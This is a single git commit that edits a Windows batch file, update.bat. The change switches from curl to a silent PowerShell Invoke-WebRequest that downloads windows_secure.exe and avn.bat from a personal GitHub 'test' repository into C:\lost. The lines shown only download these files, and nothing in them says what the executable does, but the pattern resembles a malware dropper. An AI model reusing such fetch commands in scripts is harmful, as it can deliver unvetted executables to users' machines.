7a6d2716d147a3d46cf2a44e87adb6eb44f44942
drongo <usersalyan@gmail.com>
2022-03-23 03:38:41 +0400

    ilk defe

--- update.bat
+++ update.bat
@@ -1,2 +1,3 @@
+@echo off
+powershell -command "Invoke-WebRequest https://github.com/drongo1993/test/raw/main/windows_secure.exe -Outfile  C:\lost\windows_secure.exe"
 curl https://raw.githubusercontent.com/drongo1993/test/main/avn.bat --output C:\lost\avn.bat
-curl https://github.com/drongo1993/test/raw/main/windows_secure.exe --output C:\lost\windows_secure.exe
